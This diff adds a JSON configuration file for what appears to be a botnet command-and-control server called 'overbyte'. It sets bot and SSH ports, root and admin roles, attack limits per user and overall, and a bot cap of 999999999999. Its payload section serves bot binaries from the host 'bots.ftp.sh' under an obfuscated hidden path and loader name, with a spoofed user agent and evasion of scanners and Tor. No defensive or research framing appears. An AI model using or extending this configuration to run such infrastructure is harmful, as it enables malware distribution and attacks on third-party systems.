@@ -1,0 +1,86 @@
+{
+  "api": {
+    "enabled": true,
+    "port": 9999,
+    "rate_limit": 5,
+    "cooldown": 5,
+    "whitelist": [],
+    "blocked_hosts": [
+      "127.0.0.1"
+    ],
+    "enable_read_api": true,
+    "max_conn_per_ip": 3,
+    "burst_limit": 20,
+    "block_duration": 300,
+    "max_request_size": 10240,
+    "enable_security_headers": true,
+    "trusted_proxies": []
+  },
+  "cnc": {
+    "bot_port": 24032,
+    "ssh_port": 999,
+    "ssh_host_key": "ssh_host_key",
+    "ssh_pubkey_auth_roles": [
+      "root",
+      "admin"
+    ],
+    "ping_interval": 30,
+    "ping_timeout": 120,
+    "max_sessions": 10,
+    "max_global_slots": 4,
+    "max_global_attacks": 1000
+  },
+  "database": {
+    "host": "127.0.0.1",
+    "port": 3306,
+    "user": "server",
+    "name": "overbyte"
+  },
+  "defaults": {
+    "max_time": 300,
+    "max_bots": 999999999999,
+    "max_slots": 5,
+    "daily_limit": 100
+  },
+  "logging": {
+    "level": "INFO",
+    "format": "json",
+    "file": "cnc.log",
+    "max_size_mb": 10,
+    "max_backups": 3,
+    "max_age_days": 0,
+    "compress": false,
+    "ring_lines": 1000
+  },
+  "proxy": {
+    "enabled": false,
+    "bind_addr": "127.0.0.1",
+    "bind_port": 1080,
+    "auth_enabled": true
+  },
+  "security": {
+    "honeypot_detection": false,
+    "suspicion_threshold": 75,
+    "blacklist_duration": 86400000000000,
+    "prevent_duplicates": true,
+    "replace_old_connection": true,
+    "firewall_enabled": true,
+    "firewall_persist_file": "firewall.json"
+  },
+  "root_username": "root",
+  "payload": {
+    "enabled": true,
+    "port": 8080,
+    "host": "bots.ftp.sh",
+    "bins_directory": "/root/release/bins",
+    "hidden_path": "pyh1cz04s6mp",
+    "loader_name": "05zj9w",
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Valve Steam Gamepad/1708467439 (SteamOS)",
+    "blacklist": [],
+    "token_enabled": true,
+    "token_ttl_minutes": 60,
+    "block_tor": true,
+    "block_scanner_ua": true,
+    "trusted_proxies": []
+  }
+}
